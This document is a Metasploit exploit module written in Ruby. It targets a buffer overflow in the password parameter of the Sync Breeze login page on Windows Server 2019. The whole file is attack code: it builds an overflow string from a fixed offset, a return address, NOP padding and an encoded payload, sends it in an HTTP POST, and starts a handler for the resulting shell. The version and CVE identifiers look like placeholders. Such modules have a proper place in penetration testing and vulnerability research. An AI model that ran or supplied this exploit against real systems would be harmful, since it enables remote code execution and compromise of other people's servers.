require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::HttpClient
  
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Sync Breeze Password Overflow',
      'Description'    => %q{
          This module exploits a buffer overflow in Sync Breeze V.X by overflowing the "password" parameter during the HTTP POST to /login.
      },
      'Author'         => [ 'Jacob' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2025-1234' ],
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process',
        },
      'Privileged'     => false,
      'Payload'        =>
        {
          'Space'    => 750,
          'BadChars' => "\x00",
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Windows Server 2019', { 'Offset' => 520, 'Ret' => 0x10090C83 } ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => '2025-06-06'))
  end

  def exploit
    evil =  rand_text_alpha(target['Offset'])
    evil << [target['Ret']].pack('V')
    evil << make_nops(16)
    evil << payload.encoded

    print_status("Sending payload to #{target.name} (#{peer})...")

    send_request_cgi({
      'uri'        => '/login',
      'method'     => 'POST',
      'vars_post'  => {
        'username' => 'test',
        'password' => evil
      }
    })

    handler
  end
end
